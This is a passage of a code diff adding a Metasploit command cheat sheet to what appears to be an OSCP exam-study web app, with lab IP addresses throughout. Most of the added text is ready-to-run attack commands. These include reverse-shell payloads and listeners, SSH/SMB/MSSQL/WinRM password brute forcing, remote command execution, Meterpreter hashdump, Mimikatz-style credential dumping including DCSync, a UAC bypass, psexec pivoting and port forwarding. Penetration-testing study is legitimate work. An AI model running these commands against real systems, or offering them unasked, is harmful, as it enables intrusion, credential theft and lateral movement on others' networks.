+services -p 445                    # filter by port
+services -p 445 --rhosts           # set RHOSTS from port-filtered results
+vulns                              # show detected vulnerabilities
+creds                              # show stored credentials
+loot                               # show looted files/data
+notes                              # show notes stored by modules
+
+# ── GLOBAL OPTIONS ────────────────────────────────────
+setg LHOST 192.168.45.210          # set globally — persists across modules
+setg RHOSTS 192.168.50.202         # set global target
+unsetg LHOST                       # clear global
+show advanced                      # see all advanced options incl ExitOnSession
+
+# ── SEARCH + USE ──────────────────────────────────────
+search Apache 2.4.49               # search by name/CVE
+search type:auxiliary smb          # search by type + keyword
+search type:exploit ssh            # exploits only
+search type:post windows           # post-exploitation modules
+search cve:2021-42013              # search by CVE
+use 0                              # use by search index
+use exploit/multi/http/apache_normalize_path_rce
+info                               # show module info + side effects + reliability
+show options                       # show required options
+show missing                       # show unset required options
+show payloads                      # list compatible payloads
+show advanced                      # show advanced options
+check                              # dry-run: test if target is vulnerable
+
+# ── SET OPTIONS ───────────────────────────────────────
+set RHOSTS 192.168.50.16
+set RPORT 80
+set SSL false
+set LHOST 192.168.45.210
+set LPORT 443                      # use 443/80 — 4444 commonly blocked
+set THREADS 10                     # speed up aux scanners
+set VERBOSE true                   # show all attempts (brute force)
+set STOP_ON_SUCCESS true           # stop after first valid cred found
+unset RHOSTS
+set payload linux/x64/shell_reverse_tcp      # non-staged (stable)
+set payload linux/x64/shell/reverse_tcp      # staged (smaller, needs handler)
+set payload linux/x64/meterpreter_reverse_tcp
+set payload windows/x64/meterpreter_reverse_https  # stealthiest
+unset payload                      # revert to default
+
+# ── STAGED vs NON-STAGED ─────────────────────────────
+# shell_reverse_tcp  = non-staged (_ = non-staged, more stable)
+# shell/reverse_tcp  = staged (/ = staged, smaller, needs multi/handler)
+# Staged payloads NEED multi/handler — nc won't work for staged
+
+# ── RUN ───────────────────────────────────────────────
+run                                # run module (blocks)
+run -j                             # run as background job
+run -z -j                         # background job, don't auto-interact
+check                              # test vulnerability without exploiting
+
+# ── SESSIONS + JOBS ───────────────────────────────────
+sessions -l                        # list active sessions
+sessions -i 2                      # interact with session 2
+sessions -k 2                      # kill session 2
+sessions -K                        # kill ALL sessions
+sessions -u 2                      # upgrade shell → Meterpreter (no re-exploit)
+Ctrl+Z → y                         # background current session
+bg                                 # background from meterpreter prompt
+jobs                               # list background jobs
+jobs -K                            # kill all background jobs
+
+# ── ─────────────────────────────────────────────────
+# AUXILIARY MODULES — UNRESTRICTED ON OSCP
+# Use freely for scanning, enum, brute force
+# ─────────────────────────────────────────────────────
+
+# ── PORT SCANNING ─────────────────────────────────────
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.50.0/24
+set PORTS 22,80,443,445,1433,3306,3389,5985,8080,8443
+set THREADS 10
+run
+
+# ── SMB ENUMERATION ───────────────────────────────────
+# SMB version detection:
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.50.202
+run
+
+# SMB share enumeration:
+use auxiliary/scanner/smb/smb_enumshares
+set RHOSTS 192.168.50.202
+set SMBUser admin
+set SMBPass Password1!
+run
+
+# SMB user enumeration:
+use auxiliary/scanner/smb/smb_enumusers
+set RHOSTS 192.168.50.202
+run
+
+# EternalBlue (MS17-010) check — detection only, not exploit:
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.50.0/24
+set THREADS 10
+run
+
+# SMB login brute force:
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 192.168.50.202
+set SMBUser administrator
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set STOP_ON_SUCCESS true
+set VERBOSE false
+run
+
+# SMB login — user + pass file:
+set USER_FILE /tmp/users.txt
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run
+
+# ── SSH ENUMERATION + BRUTE FORCE ─────────────────────
+# SSH version:
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS 192.168.50.201
+run
+
+# SSH login brute force:
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.50.201
+set RPORT 22
+set USERNAME george
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set STOP_ON_SUCCESS true
+set VERBOSE false
+run
+# Valid creds auto-open a session — use sessions -l to see it
+
+# SSH user enumeration:
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOSTS 192.168.50.201
+set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+run
+
+# ── HTTP / WEB ENUMERATION ────────────────────────────
+# HTTP version + headers:
+use auxiliary/scanner/http/http_version
+set RHOSTS 192.168.50.0/24
+set THREADS 10
+run
+
+# Directory brute force:
+use auxiliary/scanner/http/dir_scanner
+set RHOSTS 192.168.50.202
+set RPORT 80
+set DICTIONARY /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+run
+
+# Apache path traversal check:
+use auxiliary/scanner/http/apache_normalize_path
+set RHOSTS 192.168.50.16
+set RPORT 80
+run
+
+# WordPress scan:
+use auxiliary/scanner/http/wordpress_scanner
+set RHOSTS 192.168.50.202
+run
+
+# ── FTP ENUMERATION ───────────────────────────────────
+# FTP anonymous login check:
+use auxiliary/scanner/ftp/anonymous
+set RHOSTS 192.168.50.0/24
+set THREADS 10
+run
+
+# FTP version:
+use auxiliary/scanner/ftp/ftp_version
+set RHOSTS 192.168.50.202
+run
+
+# FTP brute force:
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS 192.168.50.202
+set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set STOP_ON_SUCCESS true
+run
+
+# ── MSSQL ENUMERATION ─────────────────────────────────
+# MSSQL ping (find instances):
+use auxiliary/scanner/mssql/mssql_ping
+set RHOSTS 192.168.50.0/24
+run
+
+# MSSQL login brute force:
+use auxiliary/scanner/mssql/mssql_login
+set RHOSTS 192.168.50.202
+set USERNAME sa
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set STOP_ON_SUCCESS true
+run
+
+# MSSQL execute command (if creds known):
+use auxiliary/admin/mssql/mssql_exec
+set RHOSTS 192.168.50.202
+set USERNAME sa
+set PASSWORD Password1!
+set CMD whoami
+run
+
+# ── MYSQL ENUMERATION ─────────────────────────────────
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.168.50.202
+set USERNAME root
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set STOP_ON_SUCCESS true
+run
+
+# ── RDP / WINRM ENUMERATION ───────────────────────────
+# RDP check:
+use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS 192.168.50.0/24
+set THREADS 10
+run
+
+# WinRM login:
+use auxiliary/scanner/winrm/winrm_login
+set RHOSTS 192.168.50.202
+set USERNAME administrator
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set STOP_ON_SUCCESS true
+run
+
+# ── MULTI/HANDLER (catch staged/meterpreter shells) ──
+use multi/handler
+set payload windows/x64/shell/reverse_tcp
+set LHOST 192.168.45.210
+set LPORT 443
+set ExitOnSession false            # keep listening after session opens
+set AutoRunScript post/windows/manage/migrate  # auto migrate on connect
+run -j                             # background — keep working
+
+# ── METERPRETER COMMANDS ──────────────────────────────
+sysinfo                            # OS + architecture info
+getuid                             # current user
+getenv FLAG                        # read environment variable
+idletime                           # how long user has been idle
+getsystem                          # auto priv esc → SYSTEM
+ps                                 # list processes
+migrate <PID>                      # migrate to another process
+execute -H -f notepad              # spawn hidden process to migrate into
+shell                              # drop to system shell (Ctrl+Z to bg)
+channel -l                         # list channels
+channel -i 1                       # interact with channel
+download /etc/passwd               # download file to Kali
+upload /usr/bin/tool /tmp/         # upload file to target
+search -f passwords.txt            # find file on target
+hashdump                           # dump SAM hashes (needs SYSTEM)
+screenshare                        # view target desktop live
+lpwd / lcd /home/kali/Downloads    # local dir navigation
+
+# ── KIWI (Mimikatz in Meterpreter) ───────────────────
+# Requires SYSTEM — run getsystem first
+load kiwi
+creds_all                          # dump all credentials
+creds_msv                          # LM/NTLM hashes
+creds_wdigest                      # plaintext if available
+lsa_dump_sam                       # SAM database
+lsa_dump_secrets                   # LSA secrets
+dcsync_ntlm                        # DCSync NTLM hash (needs DA)
+
+# ── POST-EXPLOITATION MODULES ─────────────────────────
+search UAC                         # find UAC bypass modules
+use exploit/windows/local/bypassuac_sdclt
+set SESSION 9
+set LHOST 192.168.45.210
+run                                # spawns high-integrity Meterpreter
+
+# Enumerate hosts file:
+use post/windows/gather/enum_hostfile
+set SESSION 9
+run
+
+# Run all post modules against session:
+# /usr/share/metasploit-framework/scripts/resource/run_all_post.rc
+
+# ── PIVOTING WITH MSF ─────────────────────────────────
+# Manual route:
+route add 172.16.5.0/24 12        # route subnet through session 12
+route print
+route flush
+
+# Auto route:
+use multi/manage/autoroute
+set SESSION 12
+run
+
+# MSF SOCKS proxy (combine with autoroute):
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set VERSION 5
+run -j
+# socks5 127.0.0.1 1080 → /etc/proxychains4.conf
+
+# PSExec through pivot (bind_tcp — reverse won't route back):
+use exploit/windows/smb/psexec
+set SMBUser luiza
+set SMBPass "Password1!"
+set RHOSTS 172.16.5.200
+set payload windows/x64/meterpreter/bind_tcp
+set LPORT 8000
+run
+
+# Port forward from Meterpreter:
+portfwd add -l 3389 -p 3389 -r 172.16.5.200
+portfwd list
+portfwd delete -l 3389            # cleanup
+
+# ── RESOURCE SCRIPTS ──────────────────────────────────
+# listener.rc — save and reuse:
+# use exploit/multi/handler
+# set PAYLOAD windows/x64/meterpreter_reverse_https
+# set LHOST 192.168.45.210
+# set LPORT 443
+# set AutoRunScript post/windows/manage/migrate
+# set ExitOnSession false
+# run -z -j
+
+sudo msfconsole -r listener.rc    # load on startup
+# Built-ins: /usr/share/metasploit-framework/scripts/resource/`,
+    warn: "OSCP: AUXILIARY modules are UNRESTRICTED — scan/enum/brute freely. Exploit modules limited to ONE machine only — choose wisely. Port 4444 commonly blocked — use 443 or 80. Staged payloads need multi/handler not nc. sessions -u upgrades shell→Meterpreter without re-exploiting.",
+    choices: [
+      { label: "Meterpreter — Windows post exploit", next: "token_privs" },
+      { label: "Meterpreter — Linux post exploit", next: "linux_privesc_extra" },
+      { label: "Pivot through MSF session", next: "pivot_start" },
+      { label: "Generate payload", next: "msfvenom" },
+      { label: "Jump to technique", next: "jump_menu" },
+    ],
+  },
   login_page: {
     phase: "WEB",
     title: "Login Page",
@@ -5302,6 +6158,14 @@ run post/multi/recon/local_exploit_suggester`,
     cmd: `# ── STEP 1: SPAWN A PTY ──────────────────────────────
 # Python3 (most common)
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# If you get: bash: /root/.bashrc: Permission denied
+# = service account with homedir set to /root but not root
+# bash tries to source /root/.bashrc and fails
+# Fix: use /bin/sh instead
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+# Lab validated: Confluence box — confluence user, homedir /root
+# sh has no profile/bashrc sourcing = no permission error
 
 # Python2 fallback
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -9231,7 +10095,7 @@ export default function OSCPAdventure() {
                     return (
                       <button
                         key={i}
-                        onClick={() => go(c.next)}
+                        onClick={() => c.href ? window.open(c.href, "_blank") : go(c.next)}
                         style={{
                           background: `linear-gradient(90deg, ${nc}0c 0%, transparent 80%)`,
                           border: `1px solid ${nc}30`,
